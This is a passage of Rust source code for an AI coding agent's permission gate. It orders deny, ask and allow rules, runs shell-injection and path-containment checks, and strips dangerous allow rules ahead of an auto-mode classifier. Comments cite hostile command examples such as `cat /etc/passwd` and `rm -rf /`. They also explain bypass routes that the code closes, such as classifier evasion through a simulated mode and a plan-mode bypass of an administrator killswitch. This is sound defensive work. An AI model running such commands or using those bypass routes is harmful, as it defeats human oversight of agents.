                        read_block_dirs.as_deref(),
                    ) {
                        return self.resolve_guard_ask(
                            ask_path_constraint(tool_name, ask),
                            bypass,
                            mode,
                            &sources,
                            tool_name,
                        );
                    }
                    // 2b'. Per-command PATH CONTAINMENT (claude-code
                    //      `validateCommandPaths` + `PATH_EXTRACTORS`, run per
                    //      subcommand by `checkPathConstraints`,
                    //      `BashTool/pathValidation.ts:603/190-552`, wired at
                    //      `bashPermissions.ts:1106-1122`). Sibling of the
                    //      redirection/`cd` guard above: it covers the POSITIONAL
                    //      FILE ARGUMENTS of ~31 path-taking commands
                    //      (cat/head/grep/find/mv/cp/touch/sed/`git diff
                    //      --no-index`/…), so `cat /etc/passwd` (cwd `/proj/work`)
                    //      ASKS even past a matching `Bash(cat:*)` allow rule —
                    //      and past an EXACT `Bash(cat /etc/passwd)` rule, since
                    //      this runs BEFORE the `shell_exact_allow` short-circuit
                    //      (2c-exact) and the allow walk (step 3), exactly as TS
                    //      runs `validateCommandPaths` (step 3) ahead of the
                    //      exact-match-allow (step 4) and prefix-allow (step 5).
                    //      Shares this slot (after deny/ask, before exact/allow,
                    //      roots- + shell-gated) and the byte-locked ask path.
                    if let Some(ask) =
                        crate::command_path_containment::check_command_path_containment(
                            command,
                            roots,
                            &self.additional_working_dirs.paths(),
                            self.block_reads_outside_working_directories
                                .then(|| self.read_block_working_dirs(roots))
                                .as_deref(),
                        )
                    {
                        return self.resolve_guard_ask(
                            ask_path_constraint(tool_name, ask),
                            bypass,
                            mode,
                            &sources,
                            tool_name,
                        );
                    }
                }
            }
        }
        // The local-app source boundary is a hard deny for leased workflows.
        // Place this before shell exact-allow and the generic allow/mode
        // branches so a broad `Edit(./**)` or `Bash(...)` rule cannot turn the
        // generated workspace metadata into agent-writable state. Explicit
        // deny/ask rules have already run above and retain their precedence.
        if let (Some(leases), Some(roots)) = (&self.workspace_leases, &self.roots) {
            if leases.denies_host_owned_for_token(workspace_lease_token, tool_name, input, roots) {
                return deny_workspace_host_owned(tool_name);
            }
        }
        // The generated local-app settings file contains a broad
        // `Edit(./**)` allow for source files. Keep host-owned metadata and
        // symlink escapes protected even after the temporary build lease has
        // expired, and before any generic allow rule can short-circuit.
        if let Some(roots) = self.roots.as_ref() {
            if workspace_lease::WorkspacePermissionLeaseRegistry::denies_host_owned_for_workspace(
                tool_name, input, roots,
            ) {
                return deny_workspace_host_owned(tool_name);
            }
            if workspace_lease::WorkspacePermissionLeaseRegistry::escapes_local_app_workspace(
                tool_name, input, roots,
            ) {
                return deny_workspace_outside(tool_name);
            }
        }
        // 2c. BASH COMMAND-INJECTION SAFETY (claude-code `bashCommandIsSafe`,
        //     `bashSecurity.ts`'s legacy `bashCommandIsSafe_DEPRECATED` battery,
        //     wired at `bashPermissions.ts:1217-1239` inside
        //     `checkCommandAndSuggestRules`). In the external build tree-sitter is
        //     OFF, so `astParseSucceeded` is false and this validator chain ALWAYS
        //     runs. It scans the full command with ~23 validators (substitution,
        //     IFS injection, ANSI-C/locale quoting, backtick/`$()`, CR/newline,
        //     unicode whitespace, brace expansion, zsh `zmodload`,
        //     comment-quote-desync, …) and ASKS on the FIRST detection.
        //
        //     PRECEDENCE (1:1 with TS `checkCommandAndSuggestRules`): explicit
        //     DENY and ASK rules already short-circuited above (TS step 2a). The
        //     safety check runs BEFORE the allow walk below (TS step 4) — so an
        //     explicit ALLOW rule does NOT override a safety-ask (TS runs
        //     `bashCommandIsSafe` at step 3, ahead of the allow return at step 4).
        //     Placed AFTER the sandbox-auto-allow (1d) and the dangerous-removal /
        //     path-constraint guards (2/2b) — a sandbox-auto-allowed command never
        //     reaches the per-subcommand safety inner in TS.
        //
        //     The check is shell-tool only. Tagged
        //     [`PermissionDecisionReason::SafetyCheck`] (TS `type: 'other'`
        //     carrying the validator message; `classifier_approvable` true since
        //     the TS flow attaches a pending classifier check). SAFETY: this can
        //     only make the gate STRICTER (more asks); it never downgrades a deny
        //     and never touches non-shell tools. PER-SUBCOMMAND (1:1 with TS):
        //     the split + redirect-strip + battery lives in
        //     [`Self::shell_bash_safety_ask`].
        //
        // 2c-exact. EXACT-MATCH ALLOW SHORT-CIRCUIT (claude-code
        //     `bashToolCheckExactMatchPermission`, wired as step 1 of
        //     `checkCommandAndSuggestRules`, `bashPermissions.ts:1190-1197`). An
        //     EXACT allow rule — the WHOLE trimmed command equals the rule content
        //     (an `Bash(cmd)` rule, or a `Bash(prefix:*)` rule whose bare prefix
        //     equals the full command) — short-circuits to ALLOW at the very top
        //     of the TS flow, BEFORE the command-injection safety battery (TS step
        //     3). So a command the user EXPLICITLY allowed 1:1 is allowed without a
        //     safety re-ask. This is the EXACT case ONLY: a PREFIX allow rule does
        //     NOT bypass safety (TS returns the prefix-allow at step 4, AFTER the
        //     step-3 safety check), so the 2c safety layer below stays AHEAD of the
        //     `shell_allow` prefix/aggregation walk. Deny/ask (exact or prefix) and
        //     the dangerous-removal / path-constraint guards already short-circuited
        //     above, matching TS where exact-deny/ask (step 1 of
        //     `bashToolCheckExactMatchPermission`) precede the exact-allow return.
        //     Shell-tool + roots-gated, consistent with the rest of the shell
        //     content matching. Reuses [`shell_command::command_exact_allowed`]
        //     (the `matchMode: 'exact'` arm of `filterRulesByContentsMatchingInput`).
        if self.roots.is_some() && shell_command::is_shell_tool(tool_name) {
            if let Some(rule) = self.shell_exact_allow(tool_name, input, &sources, mode) {
                return allow_with_rule(rule);
            }
        }
        if let Some(ask) = self.shell_bash_safety_ask(
            tool_name,
            input,
            #[cfg(feature = "bash-ast")]
            bash_ast.as_ref(),
        ) {
            return self.resolve_guard_ask(ask, bypass, mode, &sources, tool_name);
        }
        // Local-app build workflows receive a temporary, canonical-root lease.
        // Explicit deny/ask rules and shell safety/containment guards have
        // already run above, so this cannot weaken policy rules or approve an
        // unsafe shell command.
        if let (Some(leases), Some(roots)) = (&self.workspace_leases, &self.roots) {
            if leases.allows_for_token(workspace_lease_token, tool_name, input, roots) {
                return allow_with_mode(mode);
            }
        }
        // 3. Allow. Shell tools need compound aggregation (a single allow rule
        //    matching ONE subcommand must not allow a whole compound command),
        //    so they take a dedicated path rather than the per-rule walk.
        if self.roots.is_some() && shell_command::is_shell_tool(tool_name) {
            if let Some(rule) = self.shell_allow(tool_name, input, &sources, mode) {
                return allow_with_rule(rule);
            }
        } else {
            for src in &sources {
                if let Some(rules) = self.allow_rules.get(src) {
                    if let Some(rule) = decide_in_source(rules, |r| {
                        if self.rule_is_available_in_mode(r, mode) {
                            self.rule_match_kind(r, tool_name, input)
                        } else {
                            RulePatternMatch::NoMatch
                        }
                    }) {
                        return allow_with_rule(rule);
                    }
                }
            }
        }
        // 3-sed. SED CONSTRAINTS (claude-code `checkSedConstraints`, TS step 5b,
        //     `bashPermissions.ts:1142-1146`). Runs in EVERY mode (not just
        //     `AcceptEdits`): each `sed` subcommand is checked against the sed
        //     allowlist — with file-writes permitted only in `AcceptEdits` — and
        //     a sed the allowlist rejects (dangerous op, or an in-place write
        //     outside the working dirs, or any in-place edit when NOT in
        //     `AcceptEdits`) ASKS with the byte-locked sed message. ORDER (1:1
        //     with TS): AFTER the allow walk (step 5 — an explicit `Bash(sed:*)`
        //     allow rule already returned above) and BEFORE the mode auto-allow
        //     (step 6) + read-only allow (step 7). A `Safe` verdict contributes
        //     nothing here (falls through to the mode / read-only layers, exactly
        //     like a TS `passthrough`). Requires [`Self::roots`] for the in-place
        //     containment check; without roots the sed layer is skipped
        //     (consistent with the other shell guards).
        if let Some(ask) = self.shell_sed_constraint_ask(tool_name, input, mode) {
            return self.resolve_guard_ask(ask, bypass, mode, &sources, tool_name);
        }
        // 3a. AcceptEdits working-dir auto-allow (claude-code `checkWritePermissionForTool`
        //     step 3, `filesystem.ts:1360-1375`). In `AcceptEdits` mode an EDITOR
        //     tool whose target path (a) passes the auto-edit safety guard
        //     (`checkPathSafetyForAutoEdit`, Batch 2 — runs FIRST at `:1242`+, so
        //     `.git`/`.claude`/dangerous/suspicious-Windows paths fall through to
        //     ask) AND (b) lives inside an allowed working dir (cwd +
        //     `additional_working_dirs`, `allWorkingDirectories` `:667-674`) is
        //     auto-allowed with a `mode` reason. This runs AFTER the deny/ask/allow
        //     walks (so explicit deny/ask rules still win — preserved by ordering)
        //     and BEFORE the generic mode fallback. On any failure the branch is
        //     simply not taken and control falls through to the `AcceptEdits`-mode
        //     ask below. Requires [`Self::roots`] (the working-dir set is derived
        //     from `roots.cwd`).
        if mode == PermissionMode::AcceptEdits && file_tool_kind(tool_name) == FileToolKind::Editor
        {
            if let Some(roots) = self.roots.as_ref() {
                if let Some(raw_path) = input_path_for_tool(tool_name, input, roots) {
                    // Safety guard runs first (Batch 2). Only a `Safe` verdict may
                    // be auto-allowed; an `Unsafe` path falls through to ask.
                    if check_path_safety_for_auto_edit(&raw_path, roots) == AutoEditSafety::Safe {
                        // Working-dir set = cwd + additional dirs (`allWorkingDirectories`).
                        let working_dirs = self.all_working_dirs(roots);
                        if path_in_allowed_working_path(
                            Path::new(raw_path.as_ref()),
                            &working_dirs,
                            roots,
                        ) {
                            return allow_with_mode(PermissionMode::AcceptEdits);
                        }
                    }
                }
            }
        }
        // 3a-bash. AcceptEdits bash auto-allow (claude-code `checkPermissionMode`
        //     + `ACCEPT_EDITS_ALLOWED_COMMANDS`, `BashTool/modeValidation.ts`,
        //     wired at `bashPermissions.ts:1142-1151`: sed-constraints THEN mode
        //     auto-allow). Sibling of the editor-tool branch above: in `AcceptEdits`
        //     mode a SHELL command auto-allows with a `mode` reason when EVERY
        //     subcommand's base command is in [`ACCEPT_EDITS_ALLOWED_COMMANDS`] —
        //     EXCEPT `sed`, which auto-allows only when its
        //     [`crate::sed_validation::sed_auto_allow_verdict`] is `Safe` (a
        //     dangerous or out-of-workdir in-place sed falls through to ask, 1:1
        //     with the TS `checkSedConstraints` step running BEFORE the mode
        //     auto-allow). ORDER: this runs AFTER the dangerous-removal (step 2)
        //     and path-constraint (step 2b) guards — which already returned an ask
        //     for `rm -rf /` / out-of-workdir redirects+cd — so it NEVER bypasses
        //     them. Requires [`Self::roots`] for the sed containment check (the
        //     working-dir set is derived from `roots.cwd` + additional dirs).
        if mode == PermissionMode::AcceptEdits && shell_command::is_shell_tool(tool_name) {
            if let Some(roots) = self.roots.as_ref() {
                if let Some(command) = shell_command::command_from_input(input) {
                    if let Some(result) = self.accept_edits_bash_auto_allow(command, roots) {
                        return result;
                    }
                }
            }
        }
        // 3c. READ-ONLY ALLOW (claude-code `bashToolHasPermission` step 7,
        //     `bashPermissions.ts:1154-1166`: `BashTool.isReadOnly(input)` →
        //     `checkReadOnlyConstraints` → allow with `decisionReason.type:
        //     'other', reason: 'Read-only command is allowed'`). A shell command
        //     whose EVERY subcommand is read-only ([`crate::read_only_command::command_is_read_only`])
        //     and that matched no deny/ask rule, no path-constraint / dangerous
        //     guard, and no allow rule is auto-allowed — the gate need not prompt
        //     for a `cat`/`ls`/`grep`. ORDER (1:1 with TS): AFTER the sed
        //     constraints (step 5b) and the mode auto-allow (step 6) and BEFORE
        //     the generic passthrough→ask (step 8). Placed ahead of the Plan
        //     backstop so a read-only command is allowed even in `Plan` mode (TS
        //     `checkReadOnlyConstraints` returns allow regardless of mode). The
        //     read-only inference is roots-independent (a pure command-shape
        //     check), so it runs whether or not [`Self::roots`] is set — but the
        //     path-constraint guard above (roots-gated) already pre-empted any
        //     out-of-workdir write, so this never auto-allows an escape.
        if Self::shell_is_read_only(tool_name, input) {
            return allow_read_only();
        }
        // 3d. COMPOUND-COMMAND ALLOW COMPOSITION (claude-code
        //     `bashToolHasPermission`'s per-subcommand `.every(_ => _.behavior
        //     === 'allow')`, `bashPermissions.ts:2239-2385`). TS maps EACH
        //     subcommand of a compound through `bashToolCheckPermission` and
        //     allows the whole command iff EVERY subcommand independently reaches
        //     an `allow` — where a subcommand may allow via an allow RULE (step
        //     4/5), the `AcceptEdits` mode auto-allow (step 6), OR the read-only
        //     inference (step 7, `BashTool.isReadOnly`). The two homogeneous
        //     layers above cover only the all-rule (`shell_allow`, step 3) and
        //     all-read-only (`shell_is_read_only`, step 3c) cases; a MIXED
        //     compound — e.g. `gh pr view … || true`, a rule-allowed `gh pr view`
        //     next to a read-only `true` — matched NEITHER and fell through to
        //     the mode ask. This layer composes them PER-SUBCOMMAND so the mixed
        //     compound is allowed, matching TS. ORDER (1:1 with TS): AFTER the
        //     read-only layer (a fully-read-only command already returned) and
        //     BEFORE the Plan backstop / mode fallback. Deny/ask rules and the
        //     dangerous/path/safety/sed guards already ran on the whole command
        //     above (TS's per-subcommand deny/ask short-circuited via those same
        //     walks), so only the ALLOW side per subcommand remains to confirm —
        //     it can never over-allow a writer or a denied subcommand.
        if let Some(result) = self.shell_compound_allow(tool_name, input, &sources, mode) {
            return result;
        }
        // .270 CronDelete/CronList inherit At's tool-local allow. Creation
        // and dynamic wakeups allow outside Auto; Auto's passthrough must
        // continue to the classifier. Explicit rules already ran above.
        if matches!(tool_name, "CronDelete" | "CronList")
            || (matches!(tool_name, "CronCreate" | "ScheduleWakeup")
                && mode != PermissionMode::Auto
                // The gate's acceptEdits SIMULATION runs this walk under
                // `AcceptEdits` while the session is in `Auto`. Without this
                // conjunct the simulation hands back the very allow the line
                // above withholds, and the probe waves both loop tools past the
                // classifier — the exact bypass this carve-out exists to stop.
                && !self.apply_auto_mode_restrictions)
        {
            return PermissionResult::Allow {
                reason: PermissionDecisionReason::Other {
                    reason: "Scheduled task tool permits this permission mode".into(),
                },
                updated_input: None,
                update_destination: None,
                metadata: PermissionMetadata::default(),
            };
        }
        // 3b. Plan-mode mutation backstop (claude-code `prepareContextForPlanMode`,
        //     `permissionSetup.ts:1462-1500`). In `Plan` mode, the primary
        //     enforcement is that mutating tools are NOT advertised on the wire
        //     (a conversation-layer concern, out of scope here); this is the
        //     permission-layer backstop. A tool that is NOT on the read-only /
        //     planning-safe allowlist ([`crate::mode_policy::is_plan_safe_tool`],
        //     the external `SAFE_YOLO_ALLOWLISTED_TOOLS` subset) and that no
        //     allow rule matched is treated as a state mutation and ASKED about
        //     (NOT denied — matching TS, the user may approve and thereby exit
        //     plan-mode constraints). Deny/ask rules and explicit allow rules
        //     already won above, so they are preserved. Plan-safe tools fall
        //     through to the generic mode fallback below (and the gate's
        //     read-only auto-allow), keeping their existing path.
        // PERM.4 — Plan-mode bypass (claude-code `permissions.ts:1268-1281`,
        //     `shouldBypassPermissions`). A `Plan` session that ORIGINALLY had
        //     `BypassPermissions` available ([`Self::bypass_permissions_available`],
        //     TS `isBypassPermissionsModeAvailable`) bypasses permissions just like
        //     `BypassPermissions` mode — the tool is ALLOWED, tagged `Plan` (1:1
        //     with TS `decisionReason: { type: 'mode', mode: 'plan' }`). It runs
        //     AFTER the deny/ask/safety walks above (which already returned), so
        //     deny rules, ask rules, and the dangerous-removal / path-constraint /
        //     sed asks stay bypass-immune — matching the TS step order (1a deny,
        //     1d ask, 1g safety all precede the 2a bypass). Subject to the same
        //     killswitch override as `BypassPermissions`.
        // `zj(D, M.isBypassPermissionsModeAvailable)` = `D==="plan" &&
        // available===true && !Ae()`, where `Ae()` is `!isInteractive()`.
        // ⚠️ The `!bypass_killswitch_active` conjunct is this port's own, and is
        // KEPT: upstream's `zj` does not consult the killswitch here (only the
        // Shift+Tab cycle's `oKe` does, as `!bS()`), so dropping it to match
        // byte-for-byte would REOPEN the plan bypass on a session whose
        // administrator disabled bypass mode. A strictly-narrowing divergence,
        // recorded rather than removed.
        if mode == PermissionMode::Plan
            && self.bypass_permissions_available
            && self.interactive_session
            && !self.bypass_killswitch_active
        {
            return allow_with_mode(PermissionMode::Plan);
        }
        if mode == PermissionMode::Plan && !crate::mode_policy::is_plan_safe_tool(tool_name) {
            // 206 splits the plan-mode ask message: a file-WRITE tool (Editor
            // kind) surfaces `Cannot write to ${path} while in plan mode.` (the
            // write-permission path, `o` = the resolved target), any other
            // non-read-only tool surfaces `Cannot call ${name} while in plan
            // mode.` (the general tool path).
            let write_path = if file_tool_kind(tool_name) == FileToolKind::Editor {
                self.roots
                    .as_ref()
                    .and_then(|roots| input_path_for_tool(tool_name, input, roots))
            } else {
                None
            };
            return ask_plan_mutation(tool_name, write_path.as_deref());
        }
        // 4. Mode fallback. `DontAsk` falls through to the generic mode ask here;
        //    the `ask`→`deny` conversion (PERM.1) is applied last in
        //    [`Self::authorize`], so read-only tools are not over-denied.
        match mode {
            PermissionMode::BypassPermissions if !self.bypass_killswitch_active => {
                allow_with_mode(PermissionMode::BypassPermissions)
            }
            _ => ask_with_mode(mode, tool_name),
        }
    }

    /// Strip every ALLOW rule that would bypass the auto-mode classifier (e.g.
    /// `Bash(python:*)`, `Agent(*)`, `PowerShell(iex:*)`), stashing the removed
    /// rules in [`Self::stripped_dangerous`] so [`Self::restore_dangerous`] can
    /// re-add them verbatim. 1:1 with `stripDangerousPermissionsForAutoMode`
    /// (`permissionSetup.ts:510-553`): the predicate is
    /// [`crate::dangerous_perms::is_dangerous_classifier_permission`].
    ///
    /// Deny/ask rules are never touched (only allow rules can auto-allow an
    /// arbitrary-code command ahead of the classifier). Idempotent in spirit but
    /// NOT a no-op on a fresh strip — call [`Self::restore_dangerous`] before
    /// re-stripping to avoid stacking the stash. (The mode-transition driver
    /// [`Self::set_mode`] guarantees a strip is always paired with a restore.)
    ///
    /// This does NOT change [`Self::authorize`] behavior on its own: Auto mode's
    /// classifier is unwired externally (Batch 6 stub), so stripping is
    /// behavior-neutral until a future wiring batch consumes Auto mode.
    pub fn strip_dangerous_for_auto(&mut self) {
        for (&source, rules) in &mut self.allow_rules {
            // Record each dangerous rule's ORIGINAL index within this bucket, then
            // restore re-inserts in ascending original-index order — which exactly
            // reconstructs the pre-strip vec (a removed slot's gap is re-filled
            // before any later removed slot is, so indices stay valid).
            let mut kept = Vec::with_capacity(rules.len());
            for (orig_idx, rule) in std::mem::take(rules).into_iter().enumerate() {
                if crate::dangerous_perms::is_dangerous_classifier_permission_with_flag(
                    &rule.value.tool_name,
                    &rule.value.rule_content,
                    self.classify_all_shell,
                ) {
                    // AUTO-06: mirror CC's per-rule strip log
                    // `Ignoring dangerous permission ${ruleDisplay} from
                    // ${sourceDisplay} (bypasses classifier)` (`SX`).
                    tracing::debug!(
                        "Ignoring dangerous permission {} from {} (bypasses classifier)",
                        rule.value.to_rule_string(),
                        crate::shadow::format_source(source),
                    );
                    self.stripped_dangerous.push(rule);
                    self.stripped_positions.push((source, orig_idx));
                } else {
                    kept.push(rule);
                }
            }
            *rules = kept;
        }
    }

    /// Re-add every allow rule previously stashed by
    /// [`Self::strip_dangerous_for_auto`] at its original bucket position, then
    /// clear the stash so a second call is a no-op. 1:1 with
    /// `restoreDangerousPermissions` (`permissionSetup.ts:561-579`). Exact
    /// inverse of a strip: `strip → restore` returns [`Self::allow_rules`] to its
    /// pre-strip contents (positions included — see [`Self::stripped_positions`]).
    pub fn restore_dangerous(&mut self) {
        let rules = std::mem::take(&mut self.stripped_dangerous);
        let positions = std::mem::take(&mut self.stripped_positions);
        // Re-insert in ascending recorded-index order so each rule lands back in
        // the same slot it was removed from (strip recorded indices in this order).
        for (rule, (source, idx)) in rules.into_iter().zip(positions) {
            let bucket = self.allow_rules.entry(source).or_default();
            let at = idx.min(bucket.len());
            bucket.insert(at, rule);
        }
    }

    /// Transition the active mode, running the auto-mode strip/restore
    /// side-effects. 1:1 with the strip/restore arms of `transitionPermissionMode`
    /// (`permissionSetup.ts:597-646`, the `:627-637` block):
    ///
    /// - entering `Auto` (from a non-Auto mode) → [`Self::strip_dangerous_for_auto`];
    /// - leaving `Auto` (to a non-Auto mode) → [`Self::restore_dangerous`].
    ///
    /// `to == from` is a no-op (matches the TS `fromMode === toMode` guard).
    /// The Plan-mode attachment and classifier-gate side-effects from TS are out
    /// of scope here (Plan is Batch 3; the LLM classifier is the stubbed Batch 6
    /// non-goal). Strip/restore is behavior-neutral on [`Self::authorize`] until
    /// Auto's classifier is wired, so this is safe to call now.
    pub fn set_mode(&mut self, to: PermissionMode) {
        let from = self.mode;
        if from == to {
            return;
        }
        if to == PermissionMode::Auto && from != PermissionMode::Auto {
            self.strip_dangerous_for_auto();
        } else if from == PermissionMode::Auto && to != PermissionMode::Auto {
            self.restore_dangerous();
        }
        self.mode = to;
    }

    /// Does `rule` apply to a call of `tool_name` with `input`?
    ///
    /// - No [`Self::roots`] → phase-2 verbatim: exact tool-name match (content
    ///   ignored). Preserves all pre-3a behavior and tests.
    /// - TOOL-WIDE rule (`rule_content == None`) → exact tool-name match
    ///   (claude-code `toolMatchesRule`; MCP server-level wildcard is not
    ///   modeled — phase-2 parity).
    /// - CONTENT rule on a NON-file tool → exact tool-name match (3a-bash
    ///   deferral: `Bash`/`WebFetch` content still matches tool-wide).
    /// - CONTENT rule on a file tool → group + path match:
    ///   - editor tool consults `Edit`-named rules;
    ///   - reader tool consults `Read`-named rules, plus `Edit`-named rules
    ///     with `Allow` behavior (edit-allow ⇒ read-allow). An `Edit`-named
    ///     DENY rule never blocks a read (claude-code `checkRead` only consults
    ///     `read` deny rules) — the `behavior == Allow` clause enforces this
    ///     because deny rules are only ever evaluated from the deny bucket.
    fn rule_match_kind(
        &self,
        rule: &PermissionRule,
        tool_name: &str,
        input: &serde_json::Value,
    ) -> RulePatternMatch {
        let Some(roots) = self.roots.as_ref() else {
            // No roots → phase-2: file/shell content is ignored (matched
            // tool-wide). Tool-wide rules (`rule_content == None`) honor the
            // MCP server-level prefix match (PERM.2, claude-code
            // `toolMatchesRule`); content rules keep the phase-2 exact
            // tool-name match.
            return kind(if rule.value.rule_content.is_none() {
                tool_wide_name_matches_opts(&rule.value.tool_name, tool_name, rule_uses_glob(rule))
            } else {
                rule.value.tool_name == tool_name
            });
        };
        let Some(pattern) = rule.value.rule_content.as_deref() else {
            // PERM.2 — tool-wide rule → tool-name match, INCLUDING the MCP
            // server-level prefix match (claude-code `toolMatchesRule`: rule
            // `mcp__server` matches tool `mcp__server__tool`; `mcp__server__*`
            // matches all of that server's tools). GLOB-01: DENY/ASK rules also
            // glob-match (`h8`/`kqe` pass `globMatching:!0`); ALLOW rules do not
            // (`nes` default opts).
            return kind(tool_wide_name_matches_opts(
                &rule.value.tool_name,
                tool_name,
                rule_uses_glob(rule),
            ));
        };
        // GENFIELD-01: generic `field:pattern` content matcher (claude-code
        // `Mjr`), used by the DENY and ASK content walks ONLY (`Mjr(o,e,t,"deny")`
        // / `Mjr(o,e,t,"ask")` — never the allow walk). A content rule of the form
        // `field:pattern` matches when: the rule targets this tool, the field is
        // NOT the tool's dedicated `ruleContentField` (those keep their dedicated
        // matchers below), the input OWNS that field as a primitive, and the
        // pattern glob-matches (`_pi`) the stringified, trimmed value. This lets
        // `deny:["Agent(subagent_type:foo*)"]` / `deny:["WebSearch(query:*secret*)"]`
        // match, which the dedicated-key logic below cannot express. Gated on
        // DENY/ASK (over-restrict only — never broadens an allow).
        if rule_uses_glob(rule) && rule.value.tool_name == tool_name {
            if let Some((field, pat)) = split_field_pattern(pattern) {
                if Some(field) != tool_rule_content_field(tool_name) {
                    if let Some(value) = input.get(field).and_then(stringify_primitive) {
                        if glob_name_matches(pat, value.trim()) {
                            return RulePatternMatch::Match;
                        }
                    }
                }
            }
        }
        let group_ok = match file_tool_kind(tool_name) {
            FileToolKind::NonFile => {
                // Shell tools: CONTENT rule matches the command (any-subcommand,
                // aggressive stripping). Correct for deny/ask; allow uses the
                // dedicated `shell_allow` aggregation instead of this per-rule
                // path. Other non-file tools keep tool-wide matching.
                if shell_command::is_shell_tool(tool_name) && rule.value.tool_name == tool_name {
                    let Some(command) = shell_command::command_from_input(input) else {
                        return RulePatternMatch::NoMatch;
                    };
                    return kind(shell_command::rule_matches_any_subcommand(pattern, command));
                }
                // PERM.3 — other NON-file tools: a CONTENT rule applies ONLY when
                // the rule's content equals the tool-specific content key derived
                // from the input (claude-code per-tool
                // `getRuleByContentsForTool(...).get(ruleContent)` — e.g. WebFetch
                // `domain:{host}`, Agent `{agentType}`). A content rule must NOT
                // match tool-wide; tools without a known content scheme never
                // match on content (fail-safe, so an over-broad rule cannot deny
                // unrelated calls).
                if rule.value.tool_name != tool_name {
                    return RulePatternMatch::NoMatch;
                }
                let Some(key) = tool_content_key(tool_name, input) else {
                    return RulePatternMatch::NoMatch;
                };
                // WebFetch `domain:` rules support normalization + wildcards
                // (claude-code `y$n`/`v$a`/`bRp`, #31); other content tools
                // (Agent) stay raw-equality.
                return kind(if tool_name == "WebFetch" {
                    domain_rule_matches(pattern, &key)
                } else {
                    key == pattern
                });
            }
            FileToolKind::Editor => rule.value.tool_name == "Edit",
            FileToolKind::Reader => {
                rule.value.tool_name == "Read"
                    || (rule.value.tool_name == "Edit"
                        && matches!(rule.behavior, PermissionBehavior::Allow))
            }
        };
        if !group_ok {
            return RulePatternMatch::NoMatch;
        }
        let Some(path) = input_path_for_tool(tool_name, input, roots) else {
            return RulePatternMatch::NoMatch;
        };
        // The polarity is carried OUT of this function, not collapsed here: a
        // `!`-negated rule cancels an earlier match from the same settings
        // source, which only `decide_in_source` can see.
        test_rule_pattern(&path, pattern, rule.source, rule.behavior, roots)
    }

    fn rule_is_available_in_mode(&self, rule: &PermissionRule, mode: PermissionMode) -> bool {
        (mode != PermissionMode::Auto && !self.apply_auto_mode_restrictions)
            || !crate::dangerous_perms::is_dangerous_classifier_permission_with_flag(
                &rule.value.tool_name,
                &rule.value.rule_content,
                self.classify_all_shell,
            )
    }

    /// First rule in `bucket` (walked highest→lowest source priority) that
    /// applies to this call AND is in the requested tier: `content == false`
    /// selects TOOL-WIDE rules (`rule_content == None`, claude-code
    /// `toolMatchesRule`), `content == true` selects CONTENT rules. Splitting
    /// the tiers lets `authorize` order tool-wide-ask ahead of content-deny as
    /// the TS general checker does.
    fn first_match<'a>(
        &self,
        bucket: &'a HashMap<PermissionRuleSource, Vec<PermissionRule>>,
        sources: &[PermissionRuleSource],
        tool_name: &str,
        input: &serde_json::Value,
        content: bool,
    ) -> Option<&'a PermissionRule> {
        for src in sources {
            if let Some(rules) = bucket.get(src) {
                if let Some(rule) = decide_in_source(rules, |r| {
                    if r.value.rule_content.is_some() == content {
                        self.rule_match_kind(r, tool_name, input)
                    } else {
                        RulePatternMatch::NoMatch
                    }
                }) {
                    return Some(rule);
                }
            }
        }
        None
    }

    /// EXACT-match allow decision for a shell tool (claude-code
    /// `bashToolCheckExactMatchPermission`, the ALLOW arm). Returns the
    /// highest-priority CONTENT allow rule whose content EXACTLY matches the full
    /// trimmed command — an `Bash(cmd)` exact rule, or a `Bash(prefix:*)` rule
    /// whose bare prefix equals the whole command. Tool-wide allow rules
    /// (`rule_content == None`) are NOT exact matches (TS exact mode matches rule
    /// CONTENT against the command string), so they are skipped here and handled
    /// by the later [`Self::shell_allow`] walk. The match itself lives in
    /// [`shell_command::command_exact_allowed`] (the `matchMode: 'exact'` arm).
    /// Used only for the safety-bypass short-circuit; the reason is the matched
    /// content rule (TS `decisionReason: { type: 'rule', rule }`).
    fn shell_exact_allow(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        sources: &[PermissionRuleSource],
        mode: PermissionMode,
    ) -> Option<&PermissionRule> {
        let command = shell_command::command_from_input(input)?;
        for src in sources {
            if let Some(rules) = self.allow_rules.get(src) {
                if let Some(rule) = rules.iter().find(|r| {
                    self.rule_is_available_in_mode(r, mode)
                        && r.value.tool_name == tool_name
                        && r.value
                            .rule_content
                            .as_deref()
                            .is_some_and(|c| shell_command::command_exact_allowed(&[c], command))
                }) {
                    return Some(rule);
                }
            }
        }
        None
    }

    /// Allow decision for a shell tool, with compound-command aggregation.
    ///
    /// 1. A TOOL-WIDE allow rule (`Bash` with no content) allows every command.
    /// 2. Otherwise the command is allowed only if EVERY subcommand is covered
    ///    by some CONTENT allow rule (`Bash(npm install:*)` etc.). Gathering
    ///    rules across all sources matches claude-code, where deny/ask/allow
    ///    precedence is by behavior, not source. The reported rule is the
    ///    highest-priority content allow rule.
    fn shell_allow(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        sources: &[PermissionRuleSource],
        mode: PermissionMode,
    ) -> Option<&PermissionRule> {
        // 1. Tool-wide allow → allow everything.
        for src in sources {
            if let Some(rules) = self.allow_rules.get(src) {
                if let Some(rule) = rules.iter().find(|r| {
                    self.rule_is_available_in_mode(r, mode)
                        && r.value.tool_name == tool_name
                        && r.value.rule_content.is_none()
                }) {
                    return Some(rule);
                }
            }
        }
        // 2. Content allow aggregation over the command's subcommands.
        let command = shell_command::command_from_input(input)?;
        let mut content_rules: Vec<&PermissionRule> = Vec::new();
        for src in sources {
            if let Some(rules) = self.allow_rules.get(src) {
                for r in rules {
                    if self.rule_is_available_in_mode(r, mode)
                        && r.value.tool_name == tool_name
                        && r.value.rule_content.is_some()
                    {
                        content_rules.push(r);
                    }
                }
            }
        }
        if content_rules.is_empty() {
            return None;
        }
        let contents: Vec<&str> = content_rules
            .iter()
            .filter_map(|r| r.value.rule_content.as_deref())
            .collect();
        if shell_command::command_fully_allowed(&contents, command) {
            content_rules.first().copied()
        } else {
            None
        }
    }

    /// `AcceptEdits` bash auto-allow decision (claude-code `checkPermissionMode`
    /// + `ACCEPT_EDITS_ALLOWED_COMMANDS`). Returns:
    /// - `Some(Allow(mode=AcceptEdits))` when EVERY subcommand's base command is
    ///   in [`ACCEPT_EDITS_ALLOWED_COMMANDS`] AND every `sed` subcommand is
    ///   [`crate::sed_validation::SedVerdict::Safe`];
    /// - `Some(Ask(Other))` when a `sed` subcommand is otherwise on the
    ///   allowlist BUT its verdict is `Unsafe` (the byte-locked sed ask, 1:1 with
    ///   TS `checkSedConstraints` returning `behavior: 'ask'` ahead of the mode
